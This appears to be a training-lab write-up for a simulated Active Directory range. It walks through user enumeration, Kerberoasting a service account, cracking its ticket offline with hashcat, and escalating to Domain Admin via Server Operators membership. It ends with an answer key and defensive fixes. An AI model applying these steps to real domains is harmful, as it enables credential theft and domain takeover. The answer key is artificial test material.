# Lab 09 — Active Directory: Finding the Path to Domain Admin

**Category:** Active Directory / Attack Path Mapping
**Domain:** `TECHBIZ.LOCAL`
**Environment:** TechBiz Security Academy — simulated practice range
**Starting position:** Single low-privilege domain account.

## Objectives
- Enumerate domain users
- Identify members of Domain Admins
- Find accounts with a Service Principal Name (SPN)
- Request a service ticket for the SPN account
- Crack the service account password
- Map the escalation path to Domain Admin

## Methodology

### 1. Enumerate domain users
```
enum users
```
```
Administrator
a.khan
r.malik
j.smith
svc_sql
svc_backup
6 users found.
```

### 2. Identify Domain Admins
```
enum admins
```
```
Administrator
a.khan
```

### 3. Find kerberoastable accounts (SPNs)
```
spn
```
```
User : svc_sql
SPN  : MSSQLSvc/db01.techbiz.local:1433
Group: Server Operators
```
Any authenticated domain user can request a Kerberos service ticket for an account holding an SPN — no special privileges required. The ticket is encrypted with the service account's password hash, making it crackable entirely offline.

### 4. Request the service ticket (Kerberoasting)
```
kerberoast svc_sql
```
```
[+] Ticket received. Hash:
$krb5tgs$23$*svc_sql$TECHBIZ.LOCAL$MSSQLSvc~db01*$a1f9...c4e2
```

### 5. Crack the ticket offline
```
hashcat -m 13100 <ticket_hash> rockyou.txt
```
```
svc_sql = Summer2023
```

### 6. Map the escalation path
```
paths
```
```
svc_sql            --[MemberOf]-->         Server Operators
Server Operators    --[CanLogOnLocally]-->  DC01
DC01                --[LocalAdmin]-->       Domain Controller

Server Operators can start/stop services on the DC, which is
equivalent to SYSTEM on the domain controller. Domain Admin is
not an exploit here — it is a consequence of group membership.
TBS{spn_to_domain_admin}
```

## Answers
| Q | Question | Answer |
|---|---|---|
| q1 | Number of users in the domain | `6` |
| q2 | Kerberoastable account | `svc_sql` |
| q3 | Cracked password of the service account | `Summer2023` |
| q4 | Kerberos attack that allows offline cracking of a service account | `Kerberoasting` |
| q5 | Flag | `TBS{spn_to_domain_admin}` |

## Takeaways
- **Kerberoasting** requires zero elevated privileges — any authenticated domain user can request a TGS ticket for any account with an SPN. If that service account has a weak password, it cracks offline with no interaction with the domain controller beyond the initial ticket request (making it very hard to detect via failed-login monitoring).
- The real vulnerability here isn't a software exploit — it's over-permissioned group membership. `svc_sql` being a member of `Server Operators` (a privileged built-in group that can manage services on domain controllers) turned a weak service-account password directly into Domain Admin-equivalent access.
- Defensive fixes: use long, randomly generated passwords (25+ characters) or Group Managed Service Accounts (gMSAs) for any account holding an SPN; audit membership of privileged built-in groups like Server Operators, Backup Operators, and Print Operators regularly, since they're frequently overlooked paths to full domain compromise.
